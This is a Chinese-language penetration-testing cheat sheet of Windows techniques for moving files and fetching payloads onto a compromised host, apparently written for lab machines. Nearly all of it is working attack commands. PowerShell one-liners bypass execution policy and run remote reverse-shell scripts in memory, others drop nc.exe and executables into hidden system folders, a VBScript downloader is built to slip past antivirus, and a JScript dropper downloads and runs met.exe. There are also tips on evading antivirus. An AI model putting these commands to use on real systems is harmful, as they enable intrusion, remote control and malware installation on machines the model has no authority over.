# windows

smb共享文件

```
in powershell

xcopy \\123.123.123.123\123\123.exe .
or
net use x: \\123.123.123.123\123\123.exe
```

powershell下载座

如果power shell在限制模式下，或者杀软会有比如常规的反弹shell没有用，多试试，能ping出来或者dns出来肯定能执行命令

```
IEX:
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.14.53/1.ps1')|iex"
powershell -nop -noni -w Hidden -ep Bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.53/1.ps1')"
$h=(New-Object -ComObject Msxml2.XMLHTTP);$h.open('GET','http://10.10.14.2/GetServiceACL.ps1',$false);$h.send();iex $h.responseText
IEX(IWR http://10.10.14.2:8000/rev.ps1 -UseBasicParsing)

download:
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.193/1.exe','c:\\programdata\1.exe')"
powershell wget 10.10.16.32/nc.exe -O C:\\Windows\\Temp\\pwn.exe
powershell -c Invoke-WebRequest -uri 'http://10.10.16.193:8001/1.exe' -outfile \windows\System32\spool\drivers\color\12.exe
powershell Invoke-WebRequest -uri 'http://10.10.16.193:8001/1.exe'
 
  
  
locations
C:\\Windows\\Temp\\
\windows\System32\spool\drivers\color\re.exe




```

vbscript 下载 2003 支持

```bash
确实可以用
echo set a=createobject(^"adod^"+^"b.stream^"):set w=createobject(^"micro^"+^"soft.xmlhttp^"):w.open^"get^",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >>downfile.vbs

cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt
```

js 下载 2003 支持

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);

C:\test>cscript /nologo downfile.js http://192.168.1.115/robots.txt




var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

exe2hex纯命令行传输文件 用之前可以先upx一下但是upx的特征可能被杀
